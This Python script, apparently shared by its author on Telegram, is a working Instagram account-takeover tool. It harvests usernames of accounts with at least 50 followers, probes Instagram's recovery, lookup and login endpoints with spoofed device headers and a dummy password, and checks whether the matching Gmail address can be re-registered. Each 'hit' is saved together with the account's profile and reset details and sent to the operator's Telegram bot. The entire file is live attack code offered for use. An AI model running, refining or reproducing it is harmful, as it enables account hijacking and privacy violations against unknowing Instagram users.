#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Unified Account Checker & Generator
جمع وتحديث بواسطة: Developer
الإصدار: 2.0 (محدث ومحسن)
"""

import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import get, post
from user_agent import generate_user_agent
from random import choice, randrange, choices
from colorama import Fore, Style, init
init(autoreset=True)

# ===============================
# إعدادات الألوان والعرض
# ===============================
E = '\033[1;31m'    # أحمر
G = '\033[1;35m'    # بنفسجي
Z = '\033[1;31m'    # أحمر
X = '\033[1;33m'    # أصفر
Z1 = '\033[2;31m'   # أحمر فاتح
F = '\033[2;32m'    # أخضر
A = '\033[2;34m'    # أزرق
C = '\033[2;35m'    # وردي
B = '\x1b[38;5;208m' # برتقالي
Y = '\033[1;34m'    # أزرق فاتح
M = '\x1b[1;37m'    # أبيض
S = '\033[1;33m'
U = '\x1b[1;37m'    # أبيض
W9 = "\033[1m\033[34m"
HH = '\033[1;34m'
R = '\033[1;31;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'

# ===============================
# المتغيرات العامة
# ===============================
hit = 0
gg = 0
bb = 0
go = 0
bm = 0
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

# ===============================
# إعدادات الثوابت
# ===============================
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
INSTAGRAM_LOOKUP_URL = "https://i.instagram.com/api/v1/users/lookup/"
INSTAGRAM_BLOKS_URL = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
INSTAGRAM_LOGIN_URL = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
INSTAGRAM_GRAPHQL_URL = 'https://www.instagram.com/api/graphql'

IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
TOKEN_FILE = 'tl.txt'
HITS_FILE = 'hits.txt'
DOMAIN = '@gmail.com'

# ===============================
# عرض الترحيب
# ===============================
def display_banner():
    print(f'''{B}{E}=============================={B}
|{F}[+] Tool Name    : {B} Instagram Unified Checker
|{F}[+] Version      : {B} 2.0 (Updated & Enhanced)
|{F}[+] TeleGram     : {B} @MRX_1wc
|{F}[+] Tool Type    : {B} Account Generator & Checker
{E}==============================''')

# ===============================
# إدخال بيانات المستخدم
# ===============================
def get_user_credentials():
    display_banner()
    token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  : ' + Z)
    print(X + ' ═════════════════════════════════  ')
    chat_id = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F} : ' + Z)
    print(X + ' ═════════════════════════════════  ')
    return token, chat_id

TOKEN, ID = get_user_credentials()

# ===============================
# عرض الإحصائيات المحدث
# ===============================
def display_stats():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[*] Instagram Unified Checker v2.0
[*] Developer : @MRX_1wc | Updated & Enhanced
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} HIT Accounts     » 「{hit + hits}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} Available IG     » 「{gg + good_ig}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} Unavailable IG   » 「{bb + bad_insta}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [4] {A} Valid Gmail      » 「{go + hits}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [5] {X} Invalid Email    » 「{bm + bad_email}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} Total Processed  » 「{hit + hits + bb + bad_insta + bm + bad_email}」
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

def update_stats():
    display_stats()

# ===============================
# مولد User Agent محسن
# ===============================
class EnhancedAgent:
    @staticmethod
    def get_instagram_ua():
        versions = ["165.1.0.29.119", "166.0.0.30.120", "167.0.0.31.121", "168.0.0.32.122"]
        android_versions = {
            "28/9": ["720dpi", "1080dpi", "1440dpi"],
            "29/10": ["720dpi", "1080dpi", "1440dpi", "2160dpi"],
            "30/11": ["1080dpi", "1440dpi", "2160dpi"],
            "31/12": ["1440dpi", "2160dpi"]
        }
        resolutions = {
            "720dpi": ["1280x720", "1920x1080"],
            "1080dpi": ["1920x1080", "2560x1440", "3840x2160"],
            "1440dpi": ["2560x1440", "3840x2160"],
            "2160dpi": ["3840x2160", "7680x4320"]
        }
        devices = {
            "samsung": ["SM-T292", "SM-G973F", "SM-A515F", "SM-G996B"],
            "google": ["Pixel 4", "Pixel 5", "Pixel 6"],
            "huawei": ["P30 Pro", "Mate 40 Pro", "P40"],
            "xiaomi": ["Mi 10", "Redmi Note 10", "Mi 11"],
            "oneplus": ["8T", "9 Pro", "Nord"],
            "sony": ["XZ2", "Xperia 1", "Xperia 5"]
        }
        
        android_ver = choice(list(android_versions.keys()))
        dpi = choice(android_versions[android_ver])
        resolution = choice(resolutions[dpi])
        brand = choice(list(devices.keys()))
        model = choice(devices[brand])
        
        return f"Instagram {choice(versions)} Android ({android_ver}; {dpi}; {resolution}; {brand}; {model}; en_US)"
    
    @staticmethod
    def get_web_ua():
        return generate_user_agent()

# ===============================
# متغيرات ديناميكية محسنة
# ===============================
class DynamicVariable:
    @staticmethod
    def get_device_id():
        return f"android-{uuid.uuid4().hex[:16]}"
    
    @staticmethod
    def get_uuid():
        return str(uuid.uuid4())
    
    @staticmethod
    def get_signature():
        return hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest()
    
    @staticmethod
    def get_csrf_token():
        return ''.join(choices(string.ascii_letters + string.digits, k=32))
    
    @staticmethod
    def get_timestamp():
        return str(int(time.time()))

# ===============================
# إعداد Google Token محسن
# ===============================
def create_google_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': EnhancedAgent.get_web_ua()
        }
        
        recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers, timeout=10)
        
        tok_match = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,"(.*?)",null,null,null,"(.*?)&',
            res1.text
        )
        
        if not tok_match:
            raise Exception("Token not found")
            
        tok = tok_match.group(2)
        cookies = {'__Host-GAPS': host}
        
        headers2 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': f'{GOOGLE_ACCOUNTS_URL}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': EnhancedAgent.get_web_ua()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                               cookies=cookies, headers=headers2, data=data, timeout=10)
        
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
        return True
    except Exception as e:
        print(f"Error creating Google token: {e}")
        return False

# ===============================
# فحص Gmail محسن
# ===============================
def check_gmail_enhanced(email):
    global bad_email, hits
    try:
        if '@' in email:
            username = email.split('@')[0]
        else:
            username = email
            
        # قراءة التوكن
        if not os.path.exists(TOKEN_FILE):
            if not create_google_token():
                return False
                
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip()
            
        if '//' not in token_data:
            if not create_google_token():
                return False
            with open(TOKEN_FILE, 'r') as f:
                token_data = f.read().strip()
                
        tl, host = token_data.split('//')
        
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': EnhancedAgent.get_web_ua()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                               params=params, cookies=cookies, headers=headers, data=data, timeout=10)
        
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            send_telegram_hit(email + DOMAIN)
            return True
        else:
            bad_email += 1
            update_stats()
            return False
            
    except Exception as e:
        print(f"Gmail check error: {e}")
        bad_email += 1
        update_stats()
        return False

# ===============================
# فحص Instagram - الطريقة الأولى (Recovery)
# ===============================
def check_instagram_recovery(email):
    global good_ig, bad_insta
    try:
        device_id = DynamicVariable.get_device_id()
        uuid_val = DynamicVariable.get_uuid()
        
        headers = {
            'User-Agent': EnhancedAgent.get_instagram_ua(),
            'Cookie': COOKIE_VALUE,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uuid_val,
                              'guid': uuid_val,
                              'device_id': device_id,
                              'query': email
                          })),
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=10)
        
        if email in response.text:
            good_ig += 1
            update_stats()
            if DOMAIN in email:
                check_gmail_enhanced(email)
            return True
        else:
            bad_insta += 1
            update_stats()
            return False
            
    except Exception as e:
        print(f"Instagram recovery check error: {e}")
        bad_insta += 1
        update_stats()
        return False

# ===============================
# فحص Instagram - الطريقة الثانية (Lookup)
# ===============================
def check_instagram_lookup(email):
    global gg, bb
    try:
        device_id = DynamicVariable.get_device_id()
        uuid_val = DynamicVariable.get_uuid()
        signature = DynamicVariable.get_signature()
        
        payload = f"signed_body={signature}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{randrange(1, 999)}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{DynamicVariable.get_csrf_token()}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid_val}%22%2C%22device_id%22%3A%22{device_id}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"
        
        headers = {
            'User-Agent': EnhancedAgent.get_instagram_ua(),
            'Accept-Encoding': "gzip, deflate",
            'Content-Type': "application/x-www-form-urlencoded",
            'X-Pigeon-Session-Id': DynamicVariable.get_uuid(),
            'X-Pigeon-Rawclienttime': str("{:.3f}".format(time.time())),
            'X-IG-Connection-Speed': "-1kbps",
            'X-IG-Bandwidth-Speed-KBPS': "-1.000",
            'X-IG-Bandwidth-TotalBytes-B': "0",
            'X-IG-Bandwidth-TotalTime-MS': "0",
            'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
            'X-IG-Connection-Type': "MOBILE(LTE)",
            'X-IG-Capabilities': "3brTvw==",
            'X-IG-App-ID': "567067343352427",
            'Accept-Language': "ar-YE, en-US",
            'X-FB-HTTP-Engine': "Liger",
        }
        
        response = requests.post(INSTAGRAM_LOOKUP_URL, data=payload, headers=headers, timeout=10)
        
        if '"status":"ok"' in response.text and email in response.text:
            gg += 1
            update_stats()
            check_gmail_enhanced(email)
            return True
        elif '"message":"لم يتم العثور على مستخدمين","status":"fail"' in response.text:
            bb += 1
            update_stats()
            return False
        else:
            return check_instagram_login(email)
            
    except Exception as e:
        print(f"Instagram lookup error: {e}")
        return check_instagram_login(email)

# ===============================
# فحص Instagram - الطريقة الثالثة (Login)
# ===============================
def check_instagram_login(email):
    global gg, bb
    try:
        tim = DynamicVariable.get_timestamp()
        psw = "qweaszxpo9999##$$"
        
        payload = f"params=%7B%22client_input_params%22%3A%7B%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22sim_phones%22%3A%5B%5D%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22Zt4loQABAAFzGR1YLL2M9XOkL9El%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A1%3A{tim}%3A{psw}%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{email}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%226947f919-c7d1-471a-b1b6-56bbd1e5e844%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%225ea5qa%3A135%22%2C%22is_from_empty_password%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22username_text_input_id%22%3A%225ea5qa%3A134%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.2631949000395E13%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"
        
        headers = {
            'User-Agent': EnhancedAgent.get_instagram_ua(),
            'x-ig-app-locale': "en-US",
            'x-ig-device-locale': "en-US",
            'x-ig-mapped-locale': "en-US",
            'x-pigeon-session-id': "UFS-e075495d-6e46-4687-a0ac-3fb1210b71be-0",
            'x-pigeon-rawclienttime': str(time.time()),
            'x-ig-bandwidth-speed-kbps': "-1.000",
            'x-ig-bandwidth-totalbytes-b': "0",
            'x-ig-bandwidth-totaltime-ms': "0",
            'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
            'x-ig-www-claim': "0",
            'x-bloks-is-layout-rtl': "true",
            'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
            'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
            'x-ig-android-id': "android-bf1b282ab2b0b445",
            'x-ig-timezone-offset': "10800",
            'x-fb-connection-type': "MOBILE.LTE",
            'x-ig-connection-type': "MOBILE(LTE)",
            'x-ig-capabilities': "3brTv10=",
            'x-ig-app-id': "567067343352427",
            'priority': "u=3",
            'accept-language': "en-US",
            'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
            'ig-intended-user-id': "0",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'x-fb-http-engine': "Liger",
            'x-fb-client-ip': "True",
            'x-fb-server-cluster': "True"
        }
        
        response = requests.post(INSTAGRAM_LOGIN_URL, data=payload, headers=headers, timeout=10)
        
        if '"status":"ok"' in response.text:
            if "The password you entered is incorrect." in response.text or "Login Error: An unexpected error occurred." in response.text:
                gg += 1
                update_stats()
                check_gmail_enhanced(email)
                return True
            elif "Please wait a few minutes before you try again." in response.text:
                return check_instagram_recovery(email)
            else:
                bb += 1
                update_stats()
                return False
        else:
            bb += 1
            update_stats()
            return False
            
    except Exception as e:
        print(f"Instagram login check error: {e}")
        bb += 1
        update_stats()
        return False

# ===============================
# مولد الأسماء المحسن (GraphQL)
# ===============================
def generate_username_graphql():
    try:
        data = {
            'lsd': ''.join(choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': str(randrange(1629010000, 8597939245)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        
        headers = {
            'X-FB-LSD': data['lsd'],
            'User-Agent': EnhancedAgent.get_web_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        response = requests.post(INSTAGRAM_GRAPHQL_URL, headers=headers, data=data, timeout=10)
        user_data = response.json().get('data', {}).get('user', {})
        
        if user_data and user_data.get('username'):
            username = user_data.get('username')
            followers = user_data.get('follower_count', 0)
            
            # تخطي الحسابات ذات المتابعين القليل
            if followers < 50:
                return None
                
            # حفظ معلومات الحساب للاستخدام لاحقاً
            infoinsta[username] = user_data
            return username
            
        return None
        
    except Exception as e:
        print(f"GraphQL generation error: {e}")
        return None

# ===============================
# الحصول على معلومات إضافية للحساب
# ===============================
def get_account_reset_info(username):
    try:
        headers = {
            'X-Pigeon-Session-Id': DynamicVariable.get_uuid(),
            'X-Pigeon-Rawclienttime': str(time.time()),
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': EnhancedAgent.get_instagram_ua(),
            'Accept-Language': 'en-GB, en-US',
            'Cookie': COOKIE_VALUE,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive'
        }
        
        data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                          '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                          '"adid":"' + DynamicVariable.get_uuid() + '",'
                          '"guid":"' + DynamicVariable.get_uuid() + '",'
                          '"device_id":"' + DynamicVariable.get_device_id() + '",'
                          '"query":"' + username + '"}'),
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=10)
        result = response.json()
        return result.get('email', 'No Reset Info')
        
    except Exception as e:
        return 'Reset Info Error'

# ===============================
# إرسال النتائج عبر Telegram
# ===============================
def send_telegram_hit(email):
    global hit
    try:
        username = email.split("@")[0]
        hit += 1
        
        # الحصول على معلومات الحساب من البيانات المحفوظة
        account_info = infoinsta.get(username, {})
        
        name = account_info.get('full_name', 'N/A')
        user_id = account_info.get('pk', 'N/A')
        followers = account_info.get('follower_count', 'N/A')
        following = account_info.get('following_count', 'N/A')
        bio = account_info.get('biography', 'N/A')
        posts = account_info.get('media_count', 'N/A')
        is_private = account_info.get('is_private', 'N/A')
        reset_info = get_account_reset_info(username)
        
        message = f"""
⋘─────━ 𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 ━─────⋙
🎯 Instagram Unified Checker v2.0
═══════════════════════════════
💌 Email      ➤ {email}
👻 Username   ➤ @{username}
👱🏻 Name       ➤ {name}
🆔 ID         ➤ {user_id}
🔁 Followers  ➤ {followers}
🔂 Following  ➤ {following}
📋 Bio        ➤ {bio}
🎥 Posts      ➤ {posts}
🔒 Private    ➤ {is_private}
🔄 Reset      ➤ {reset_info}
📱 Profile    ➤ https://www.instagram.com/{username}
═══════════════════════════════
💯 Total Hits ➤ {hit + hits}
⚡ Tool By    ➤ @MRX_1wc
⋘─────━ 𝐔𝐍𝐈𝐅𝐈𝐄𝐃 ━─────⋙
"""
        
        # حفظ النتيجة في ملف
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(message + '\n')
        
        # إرسال عبر Telegram
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(telegram_url, data={'chat_id': ID, 'text': message}, timeout=5)
        
        print(F + f"[HIT] {email} - Sent to Telegram!")
        
    except Exception as e:
        print(f"Telegram send error: {e}")

# ===============================
# الفحص الموحد للحسابات
# ===============================
def unified_account_check(email):
    """
    فحص شامل للحساب باستخدام عدة طرق
    """
    try:
        # الطريقة الأولى: فحص Recovery
        if check_instagram_recovery(email):
            return True
            
        # الطريقة الثانية: فحص Lookup
        if check_instagram_lookup(email):
            return True
            
        # الطريقة الثالثة: فحص Login
        return check_instagram_login(email)
        
    except Exception as e:
        print(f"Unified check error: {e}")
        return False

# ===============================
# الحلقة الرئيسية لتوليد وفحص الحسابات
# ===============================
def main_generator_loop():
    """
    الحلقة الرئيسية لتوليد الأسماء وفحص الحسابات
    """
    while True:
        try:
            # توليد اسم مستخدم
            username = generate_username_graphql()
            
            if username:
                email = username + DOMAIN
                
                # فحص الحساب باستخدام الطرق المختلفة
                unified_account_check(email)
                
            # تأخير قصير لتجنب الحظر
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Main loop error: {e}")
            time.sleep(1)

# ===============================
# حلقة تحديث الإحصائيات
# ===============================
def stats_update_loop():
    """
    حلقة تحديث الإحصائيات كل ثانية
    """
    while True:
        try:
            update_stats()
            time.sleep(1)
        except:
            pass

# ===============================
# تشغيل البرنامج الرئيسي
# ===============================
def run_unified_checker():
    """
    تشغيل البرنامج الرئيسي مع المعالجة المتوازية
    """
    print(f"{F}[*] Starting Instagram Unified Checker v2.0...")
    print(f"{F}[*] Creating Google token...")
    
    # إنشاء توكن Google
    if not create_google_token():
        print(f"{E}[!] Failed to create Google token. Exiting...")
        return
    
    print(f"{F}[*] Token created successfully!")
    print(f"{F}[*] Starting checker threads...")
    
    # بدء تشغيل حلقة تحديث الإحصائيات
    stats_thread = Thread(target=stats_update_loop, daemon=True)
    stats_thread.start()
    
    # بدء تشغيل خيوط الفحص
    threads = []
    for i in range(20):  # 20 خيط متوازي
        thread = Thread(target=main_generator_loop, daemon=True)
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # تأخير قصير بين بدء الخيوط
    
    print(f"{F}[*] All threads started successfully!")
    print(f"{F}[*] Checker is now running... Press Ctrl+C to stop.")
    
    try:
        # انتظار لانهاء جميع الخيوط
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print(f"\n{X}[*] Stopping checker...")
        print(f"{F}[*] Final Stats:")
        update_stats()
        print(f"{F}[*] Checker stopped. Thank you!")

# ===============================
# التحقق من تاريخ انتهاء الصلاحية
# ===============================
def check_expiry():
    try:
        current_time = datetime.now()
        expiry_time = datetime.strptime('2026-4-19 12:00:00.000', '%Y-%m-%d %H:%M:%S.%f')
        
        if current_time > expiry_time:
            print(f'{X} ➔ {F} تـم ايـقـاف الاداة - انتهت صلاحية الأداة')
            sys.exit(0)
    except:
        pass

# ===============================
# نقطة البداية الرئيسية
# ===============================
if __name__ == "__main__":
    try:
        # التحقق من تاريخ انتهاء الصلاحية
        check_expiry()
        
        # تشغيل البرنامج الرئيسي
        run_unified_checker()
        
    except KeyboardInterrupt:
        print(f"\n{X}[*] Program interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"{E}[!] Critical error: {e}")
        sys.exit(1)
